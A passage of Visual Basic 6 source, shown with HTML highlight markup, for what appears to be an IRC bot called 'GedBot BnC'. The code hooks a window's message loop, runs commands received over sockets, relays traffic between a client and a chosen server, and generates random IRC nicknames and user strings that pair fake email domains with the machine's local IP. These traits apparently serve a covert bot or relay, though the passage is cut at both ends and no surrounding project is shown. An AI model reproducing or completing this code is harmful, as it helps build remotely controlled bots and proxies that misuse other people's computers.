</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Hook</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc7">lpPrevWndProc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc6">(</span><span class="sc7">hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">AddressOf</span><span class="sc0"> </span><span class="sc7">WindowProc</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">UnHook</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc6">(</span><span class="sc7">hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WindowProc</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">y</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">z</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ReadBuffer</span><span class="sc6">(</span><span class="sc2">1000</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBufferB</span><span class="sc6">(</span><span class="sc2">1000</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBufferC</span><span class="sc6">(</span><span class="sc2">1000</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ctncode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rptClient</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rptServer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">WelClient$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"GedBot BnC v1.0"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"/con &lt;server&gt; &lt;port&gt;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Para Salir /ExitBnC"</span><span class="sc0">

</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc0">

 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1025</span><span class="sc0">

   </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0">
    </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBuffer</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">ctncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">ReadBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbUnicode</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EvalCode</span><span class="sc6">(</span><span class="sc7">ctncode</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0">
    </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"conect"</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">
    </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"cerro"</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">Form1.Timer1.Enabled</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
   </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
 
 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1026</span><span class="sc0">
 
   </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0">
    </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_ACCEPT</span><span class="sc0">
    </span><span class="sc7">cSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AcceptSock</span><span class="sc6">(</span><span class="sc7">lSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Form1.hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1027</span><span class="sc6">)</span><span class="sc0">
     </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">cSock</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
     </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WelClient$</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
     </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
    
 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1027</span><span class="sc0">
 
   </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0">
    </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0">
    </span><span class="sc7">y</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBufferB</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">y</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">rptClient</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">ReadBufferB</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbUnicode</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EvalCodeB</span><span class="sc6">(</span><span class="sc7">rptClient</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
    </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">sSock</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">bc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
   </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
   
 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1028</span><span class="sc0">
   </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0">
   </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0">
   </span><span class="sc7">z</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc6">(</span><span class="sc7">sSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBufferC</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">z</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">rptServer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">ReadBufferC</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbUnicode</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EvalCodeC</span><span class="sc6">(</span><span class="sc7">rptServer</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
   </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0">
   </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"conect"</span><span class="sc0">
   
   </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">
   </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">sSock</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WelClient$</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc7">bc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
   </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

    </span><span class="sc7">WindowProc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CallWindowProc</span><span class="sc6">(</span><span class="sc7">lpPrevWndProc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">pSock</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc0">
</span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">rtncode</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc7">DoEvents</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">pSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
            </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Wend</span><span class="sc0">
</span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">pSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GNU</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Randomize</span><span class="sc0">
</span><span class="sc7">GNU</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GNU</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"NICK "</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">GNU</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GNU</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">65</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">GNU</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GNU</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GSU</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">GSU</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GSU</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"USER "</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc7">GSU</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GSU</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">65</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">ur</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"terra.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"hotmail.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zonav.org"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"aol.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"msn.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"latinmail.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"yahoo.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"startmedia.com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"prodigy.mx"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">us</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ur</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">GSU</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GSU</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">us</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetLclIP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">":"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">us</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetLclIP</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">StartWinsock</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hostname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostent_addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Host</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">gethostname</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">hostname</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Trim$</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">hostent_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">hostent_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">Host</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostent_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">LenB</span><span class="sc6">(</span><span class="sc7">Host</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Host.h_addr_list</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Host.h_length</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Host.h_length</span><span class="sc0">

</span><span class="sc7">ip_address</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Host.h_length</span><span class="sc0">
</span><span class="sc7">ip_address</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">ip_address</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid$</span><span class="sc6">(</span><span class="sc7">ip_address</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">

